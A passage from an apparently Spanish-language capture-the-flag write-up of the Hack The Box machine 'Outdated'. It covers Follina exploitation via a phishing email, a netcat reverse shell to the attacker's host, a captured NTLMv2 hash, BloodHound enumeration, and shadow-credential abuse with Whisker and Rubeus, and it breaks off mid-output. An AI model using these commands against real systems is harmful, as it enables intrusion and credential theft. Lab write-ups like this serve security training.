</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>[*] Config file parsed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>08/26/2024 10:20:57 PM: INFO: Config file parsed</span></span></code></pre></div>
<p>Ahora enviamos el correo&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>swaks --to itsupport@outdated.htb --from pointedsec@gmail.com --server mail.outdated.htb --body <span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.125/&#34;</span> --header <span style="color:#0ff;font-weight:bold">&#34;Subject:Internal Web App Request&#34;</span></span></span></code></pre></div>
<p>Ahora cambiamos el comando del exploit para utilizar el <code>netcat</code> que estamos sirviendo por el SMB y mandarnos una revshell.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>python3 follina_exploit.py -c <span style="color:#0ff;font-weight:bold">&#34;cmd.exe /c \\\\10.10.14.125\\smbFolder\\nc.exe 10
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#0ff;font-weight:bold">.10.14.125 443 -e cmd.exe&#34;</span></span></span></code></pre></div>
<p>Podemos ver que capturamos el hash NTLMv2 aunque no tenemos suerte crackeándolo.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>btables::OUTDATED:aaaaaaaaaaaaaaaa:4f766168c3ca8028d88c51e98dc81a75:0101000000000000006ca9caf5f7da0135533e5bdf5a4d33000000000100100048006e0059005700760078006c006c000300100048006e0059005700760078006c006c000200100063006900710045005100470049005200040010006300690071004500510047004900520007000800006ca9caf5f7da0106000400020000000800300030000000000000000000000000200000a52701887bc37024800a419b24ee2e442f357d2961a11062e59a2a6f8b7aa81c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320035000000000000000000</span></span></code></pre></div>
<p>Y conseguimos acceso.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.125] from (UNKNOWN) [10.129.229.239] <span style="color:#ff0;font-weight:bold">49849</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 10.0.19043.928]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>(c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\A</span>ppData<span style="color:#0ff;font-weight:bold">\L</span>ocal<span style="color:#0ff;font-weight:bold">\T</span>emp<span style="color:#0ff;font-weight:bold">\S</span>DIAG_9caee2d7-dad7-40ff-bc98-6b0868f102ae&gt;whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>outdated<span style="color:#0ff;font-weight:bold">\b</span>tables</span></span></code></pre></div>
<p>Ganamos acceso como el usuario <code>btables</code></p>
<p>Podemos comprobar que estamos en otro equipo que no es el DC.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\A</span>ppData<span style="color:#0ff;font-weight:bold">\L</span>ocal<span style="color:#0ff;font-weight:bold">\T</span>emp<span style="color:#0ff;font-weight:bold">\S</span>DIAG_9caee2d7-dad7-40ff-bc98-6b0868f102ae&gt;ipconfig
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>ipconfig
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Windows IP Configuration
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Ethernet adapter Ethernet:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>   Connection-specific DNS Suffix  . : 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>   IPv4 Address. . . . . . . . . . . : 172.16.20.20
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>   Default Gateway . . . . . . . . . : 172.16.20.1</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables&gt;hostname
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>hostname
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>client</span></span></code></pre></div>
<h2 id="bloodhound-time">Bloodhound time</h2>
<p>Después de pasar el <code>winpeas.exe</code> y no encontrar casi nada relevante, ni si quiera la flag de usuario, decidí pasar el <code>SharpHound.exe</code> para hacer un análisis con bloodhound.</p>
<p>Nos lo pasamos a la máquina víctima.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt;copy <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\S</span>harpHound.exe .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>copy <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\S</span>harpHound.exe .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        <span style="color:#ff0;font-weight:bold">1</span> file(s) copied.</span></span></code></pre></div>
<p>Lo ejecutamos y esperamos a que termine&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt;.<span style="color:#0ff;font-weight:bold">\S</span>harpHound.exe -c All</span></span></code></pre></div>
<p>Ahora nos copiamos el resultado a nuestro equipo.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt;copy 20240826183058_BloodHound.zip <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\2</span>0240826183058_BloodHound.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>copy 20240826183058_BloodHound.zip <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\2</span>0240826183058_BloodHound.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        <span style="color:#ff0;font-weight:bold">1</span> file(s) copied.</span></span></code></pre></div>
<p>Iniciamos la base de datos <code>neo4j</code> que es la que usa <code>bloodhound</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>sudo neo4j start
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Directories in use:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>home:         /usr/share/neo4j
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>config:       /usr/share/neo4j/conf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>logs:         /etc/neo4j/logs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>plugins:      /usr/share/neo4j/plugins
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>import:       /usr/share/neo4j/import
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>data:         /etc/neo4j/data
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>certificates: /usr/share/neo4j/certificates
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>licenses:     /usr/share/neo4j/licenses
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>run:          /var/lib/neo4j/run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Starting Neo4j.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Started neo4j (pid:8746). It is available at http://localhost:7474
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>There may be a short delay <span style="color:#fff;font-weight:bold">until</span> the server is ready.</span></span></code></pre></div>
<p>Ahora ejecutamos el <code>bloodhound</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>bloodhound &amp;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[1] <span style="color:#ff0;font-weight:bold">9245</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#fff;font-weight:bold">disown</span> %1</span></span></code></pre></div>
<p>Cargamos el archivo zip en el <code>bloodhound</code>
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Encontramos lo siguiente.</p>
<p>El usuario <code>btables</code> pertenece al grupo <code>ITSTAFF</code>, este grupo tiene el privilegio <code>AddKeyCredentialLink</code> hacia el usuario <code>sflower</code> que a su vez pertenece al  grupo <code>Remote Management Users</code> por lo cual mediante <code>WinRM</code> podríamos ganar una consola en el DC.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<blockquote>
<p>The members of the group <a href="mailto:ITSTAFF@OUTDATED.HTB">ITSTAFF@OUTDATED.HTB</a> have the ability to write to the &ldquo;msds-KeyCredentialLink&rdquo; property on <a href="mailto:SFLOWERS@OUTDATED.HTB">SFLOWERS@OUTDATED.HTB</a>. Writing to this property allows an attacker to create &ldquo;Shadow Credentials&rdquo; on the object and authenticate as the principal using kerberos PKINIT.</p>
</blockquote>
<p>Es decir, podemos crear unas Shadow Credentials para poder autenticarnos como este usuario sin cambiar las credenciales reales de este usuario usando su hash NTLM.</p>
<p>Para ello podemos descargarnos <a href="https://github.com/jakobfriedl/precompiled-binaries/raw/main/Specific/Whisker.exe">Whisker.exe</a> y moverlo a la máquina víctima.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt;copy <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>copy <span style="color:#0ff;font-weight:bold">\\</span>10.10.14.125<span style="color:#0ff;font-weight:bold">\s</span>mbFolder<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        <span style="color:#ff0;font-weight:bold">1</span> file(s) copied.</span></span></code></pre></div>
<p>Ahora también necesitamos movernos el <a href="https://github.com/jakobfriedl/precompiled-binaries/raw/main/Rubeus.exe">Rubeus</a> a la máquina víctima.</p>
<p>Ahora ejecutamos el <code>Whisker.exe</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt;.<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe add /target:sflowers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>.<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe add /target:sflowers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[*] No path was provided. The certificate will be printed as a Base64 blob
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[*] No pass was provided. The certificate will be stored with the password 2Y8ae12sDimFg3QJ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[*] Searching <span style="color:#fff;font-weight:bold">for</span> the target account
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[*] Generating certificate
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>....</span></span></code></pre></div>
<p>Esto nos generará un comando para recuperar las credenciales con Rubeus.</p>
<p>Simplemente lo copiamos y lo pegamos.</p>
<p>Estuve teniendo problemas con la shell ya que <code>Rubeus</code> no me reportaba el output, así que lo que hice fue exportar el certificado a un archivo y así utilizarlo desde <code>Rubeus</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt; .<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe add /target:sflowers /path:cert.pfx
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>.<span style="color:#0ff;font-weight:bold">\W</span>hisker.exe add /target:sflowers /path:cert.pfx
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>[*] No pass was provided. The certificate will be stored with the password LRBT7MkOUQuRDTLp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>[*] Searching <span style="color:#fff;font-weight:bold">for</span> the target account
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>[*] Generating certificate
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>[*] Certificate generaged
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>[*] Generating KeyCredential
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>[*] KeyCredential generated with DeviceID 822fd180-c3b2-4f78-825a-50d9291f9aa0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>[*] Updating the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>[+] Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>[*] Saving the associated certificate to file...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>[*] The associated certificate was saved to cert.pfx
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>[*] You can now run Rubeus with the following syntax:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:<span style="color:#0ff;font-weight:bold">&#34;LRBT7MkOUQuRDTLp&#34;</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>PS C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\b</span>tables<span style="color:#0ff;font-weight:bold">\D</span>ocuments&gt; .<span style="color:#0ff;font-weight:bold">\R</span>ubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:<span style="color:#0ff;font-weight:bold">&#34;LRBT7MkOUQuRDTLp&#34;</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>.<span style="color:#0ff;font-weight:bold">\R</span>ubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:<span style="color:#0ff;font-weight:bold">&#34;LRBT7MkOUQuRDTLp&#34;</span> /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>   ______        _                      
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>  (_____ <span style="color:#0ff;font-weight:bold">\ </span>     | |                     
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>   _____) )_   _| |__  _____ _   _  ___ 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  |  __  /| | | |  _ <span style="color:#0ff;font-weight:bold">\|</span> ___ | | | |/___)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  | |  <span style="color:#0ff;font-weight:bold">\ \|</span> |_| | |_) ) ____| |_| |___ |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  |_|   |_|____/|____/|_____)____/(___/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  v2.3.2 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>[*] Action: Ask TGT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
